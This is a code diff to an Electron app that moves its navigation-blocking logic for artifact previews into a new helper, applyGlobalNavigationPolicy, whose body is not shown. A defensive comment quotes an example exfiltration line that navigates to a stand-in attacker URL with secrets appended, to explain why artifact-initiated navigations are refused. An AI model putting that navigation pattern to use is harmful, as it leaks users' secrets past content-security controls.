@@ -58,6 +58,7 @@ import type { IpcMainInvokeEvent, WebContents } from 'electron';
 import { desktopWorkspaceIdentityKey } from '../common/desktop';
 import {
   ArtifactPreviewController,
+  applyGlobalNavigationPolicy,
   artifactWebPreferences,
   confineToArtifactOrigin,
   isArtifactUrl,
@@ -2731,7 +2732,7 @@ function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
       window.contentView.addChildView(view);
       const handle: ArtifactViewHandle = {
         setBounds: (bounds) => view.setBounds(bounds),
-        loadURL: (url) => void view.webContents.loadURL(url),
+        loadURL: async (url) => await view.webContents.loadURL(url),
         close: () => view.webContents.close(),
       };
       // The controller speaks in handles, not Electron objects, so the window
@@ -3273,15 +3274,20 @@ function hardenWebContents(contents: WebContents): void {
   });
 
   const preventUntrustedNavigation = (event: Electron.Event, url: string): void => {
-    if (rendererNavigationAllowed(url)) return;
-    event.preventDefault();
     // Artifact surfaces are refused, never handed off. Opening a URL an
     // artifact composed would make Rally perform the exfiltration the egress
     // fence exists to prevent: `location = "https://attacker/?" + secrets` is a
     // navigation, which no CSP directive governs. `confineToArtifactOrigin`
-    // owns what these contents may do; this listener must not undo it.
-    if (artifactWebContents.has(contents)) return;
-    if (isAllowedExternalUrl(url)) void shell.openExternal(url);
+    // owns what these contents may do; the global listener must return before
+    // preventing anything on those contents.
+    applyGlobalNavigationPolicy({
+      event,
+      url,
+      artifactSurface: artifactWebContents.has(contents),
+      rendererAllowed: rendererNavigationAllowed,
+      externalAllowed: isAllowedExternalUrl,
+      openExternal: (target) => { void shell.openExternal(target); },
+    });
   };
   contents.on('will-navigate', preventUntrustedNavigation);
   contents.on('will-redirect', preventUntrustedNavigation);
